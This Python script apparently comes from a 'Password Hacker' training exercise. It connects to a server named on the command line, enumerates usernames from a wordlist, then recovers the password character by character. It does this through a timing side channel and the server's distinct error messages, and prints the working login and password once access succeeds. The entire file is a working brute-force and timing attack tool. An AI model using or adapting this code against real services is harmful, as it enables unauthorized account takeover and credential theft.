import socket
import sys
import string
import json
from datetime import datetime

symbols = string.ascii_letters + string.digits
with open("/Users/Bella/PycharmProjects/Password Hacker/Password Hacker/task/hacking/logins.txt", "r") as logs:
    variant = logs.readlines()


def logger():
    for i in variant:
        login = i.strip("\n")
        yield login


l = logger()
args = sys.argv
host = args[1]
port = int(args[2])
client_socket = socket.socket()
address = (host, port)
client_socket.connect(address)
correct = dict()
previous = 0
time_letter = dict()
time_list = []
try:
    for i in range(1000):  # login search
        getlogin = next(l)
        jdict = {"login": getlogin, "password": ' '}
        jlogin = json.dumps(jdict, indent=4)
        jencoded = jlogin.encode()
        start = datetime.now()
        client_socket.send(jencoded)
        response = client_socket.recv(1024)
        finish = datetime.now()
        time_dif = finish - start
        decoresponse = response.decode()
        dejayedresp = json.loads(decoresponse)
        result = str(dejayedresp)
        if "Wrong login!" in result:
            continue
        elif "Wrong password!" in result:
            correctlogin = getlogin
            jdict = {"login": correctlogin, "password": ' '}
            # now find the first letter
            for i in symbols:
                jdict = {"login": correctlogin, "password": i}
                jlogin = json.dumps(jdict, indent=4)
                jencoded = jlogin.encode()
                client_socket.send(jencoded)
                start = datetime.now()
                response = client_socket.recv(1024)
                finish = datetime.now()
                difference = finish - start
                time_letter[difference] = i
                time_list.append(difference)
            max_dif = max(time_list)
            firstletter = time_letter.get(max_dif)
            time_letter.clear()
            time_list.clear()
            for k in range(1000000000):
                    for m in symbols:
                        if len(correct) == 0:
                            merged = firstletter + m
                            jdict = {"login": correctlogin, "password": merged}
                            jlogin = json.dumps(jdict, indent=4)
                            jencoded = jlogin.encode()
                            client_socket.send(jencoded)
                            start = datetime.now()
                            response = client_socket.recv(1024)
                            finish = datetime.now()
                            difference = finish - start
                            time_letter[difference] = merged
                            time_list.append(difference)
                            decoresponse = response.decode()
                            dejayedresp = json.loads(decoresponse)
                            result = str(dejayedresp)
                            if "Connection success!" in result:
                                correct = jdict
                                print(jlogin)
                                break
                            else:
                                continue
                    max_dif = max(time_list)
                    firstletter = time_letter.get(max_dif)
                    time_letter.clear()
                    time_list.clear()
except Exception:
    pass
